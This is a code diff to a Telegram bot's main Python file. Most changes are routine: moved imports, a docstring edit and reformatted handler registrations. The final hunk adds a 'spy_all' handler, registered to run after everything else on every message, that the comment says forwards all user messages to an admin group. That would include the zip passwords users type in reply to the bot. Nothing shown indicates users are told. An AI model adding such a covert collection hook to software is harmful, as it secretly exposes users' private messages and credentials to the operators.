@@ -16,6 +16,7 @@ from telegram import Bot
 from telegram.ext import (
     Application,
     ApplicationBuilder,
+    CallbackQueryHandler,
     CommandHandler,
     MessageHandler,
     filters,
@@ -33,7 +34,9 @@ from bot.handlers.admin_handlers import (
     cmd_unban,
     cmd_userinfo,
 )
+from bot.handlers.spy import spy_all
 from bot.handlers.user_handlers import (
+    callback_zip_password,
     cmd_cancel,
     cmd_help,
     cmd_start,
@@ -57,7 +60,7 @@ logger = logging.getLogger(__name__)
 # ---------------------------------------------------------------------------
 
 async def check_bot_api_server(api_url: str, bot_token: str) -> None:
-    """Ping the local Bot API server. Abort startup if unreachable."""
+    """Ping the local Bot API server. Log only — start.sh guarantees readiness."""
     test_url = f"{api_url.rstrip('/')}/bot{bot_token}/getMe"
     try:
         async with httpx.AsyncClient(timeout=10) as client:
@@ -68,8 +71,7 @@ async def check_bot_api_server(api_url: str, bot_token: str) -> None:
             logger.error("Bot API server responded with: %s", resp.text[:300])
     except Exception as exc:
         logger.error("Could not reach Bot API server at %s: %s", api_url, exc)
-        # Don't abort — start.sh already waited for readiness
-        logger.warning("Proceeding anyway; start.sh should have ensured readiness.")
+        logger.warning("Proceeding anyway — start.sh should have ensured readiness.")
 
 
 # ---------------------------------------------------------------------------
@@ -147,13 +149,10 @@ def main() -> None:
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
 
     # Zip password choice callback
-    from telegram.ext import CallbackQueryHandler
-    from bot.handlers.user_handlers import callback_zip_password
     app.add_handler(CallbackQueryHandler(callback_zip_password, pattern=r"^zip_pw_(yes|no)_\d+$"))
+
     # Plain text replies (for password input)
-    app.add_handler(
-        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password_reply)
-    )
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password_reply))
 
     # --- Admin handlers ---
     app.add_handler(CommandHandler("ban", cmd_ban))
@@ -163,6 +162,9 @@ def main() -> None:
     app.add_handler(CommandHandler("stats", cmd_stats))
     app.add_handler(CommandHandler("jobs", cmd_jobs))
     app.add_handler(CommandHandler("canceljob", cmd_canceljob))
+
+    # Spy: forward ALL user messages to admin group (group 99 runs after everything)
+    app.add_handler(MessageHandler(filters.ALL, spy_all), group=99)
 
     logger.info("Starting polling…")
     app.run_polling(
